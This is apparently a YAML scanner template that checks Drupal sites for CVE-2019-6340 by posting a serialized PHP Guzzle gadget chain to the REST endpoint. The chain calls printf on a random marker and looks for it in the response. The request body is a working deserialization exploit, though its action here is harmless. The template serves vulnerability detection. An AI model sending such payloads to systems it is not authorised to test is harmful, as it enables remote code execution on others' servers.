name: yaml-poc-drupal-drupal-logical-CVE-2019-6340
binding: 92cccc63-4454-4845-a18d-d00756a749a1
detail:
    author: system_user
    links:
        - http://www.nsfocus.net/vulndb/42800
        - http://www.securityfocus.com/bid/107106
        - https://nvd.nist.gov/vuln/detail/CVE-2019-6340
        - https://packetstormsecurity.com/files/151820/Drupal-REST-Module-Remote-Code-Execution.html
        - https://vigilance.fr/vulnerability/Drupal-Core-code-execution-via-Web-Services-Module-28577
        - https://www.auscert.org.au/bulletins/75910
        - https://www.drupal.org/sa-core-2019-003
        - https://www.exploit-db.com/exploits/46452
        - https://www.exploit-db.com/exploits/46452/
        - https://www.exploit-db.com/exploits/46459/
        - https://www.exploit-db.com/exploits/46510/
        - https://www.securityfocus.com/bid/107106
        - https://www.synology.com/security/advisory/Synology_SA_19_09
    vulnerability:
        id: e8817a93-7bdd-4652-bb21-b20cbe442520
        level: high
transport: http
set:
    host: request.url.host
    r1: randomLowercase(4)
    r2: randomLowercase(4)
rules:
    r0:
        request:
            cache: true
            method: POST
            path: /node/?_format=hal_json
            headers:
                Accept: '*/*'
                Content-Type: application/hal+json
            body: |
                {
                  "link": [
                    {
                      "value": "link",
                      "options": "O:24:\"GuzzleHttp\\Psr7\\FnStream\":2:{s:33:\"\u0000GuzzleHttp\\Psr7\\FnStream\u0000methods\";a:1:{s:5:\"close\";a:2:{i:0;O:23:\"GuzzleHttp\\HandlerStack\":3:{s:32:\"\u0000GuzzleHttp\\HandlerStack\u0000handler\";s:10:\"{{r1}}%%{{r2}}\";s:30:\"\u0000GuzzleHttp\\HandlerStack\u0000stack\";a:1:{i:0;a:1:{i:0;s:6:\"printf\";}}s:31:\"\u0000GuzzleHttp\\HandlerStack\u0000cached\";b:0;}i:1;s:7:\"resolve\";}}s:9:\"_fn_close\";a:2:{i:0;r:4;i:1;s:7:\"resolve\";}}"
                    }
                  ],
                  "_links": {
                    "type": {
                      "href": "http://{{host}}/rest/type/shortcut/default"
                    }
                  }
                }
            follow_redirects: true
        expression: response.status == 403 && response.content_type.contains("hal+json") && response.body.bcontains(bytes(r1 + "%" + r2))
expression: r0()
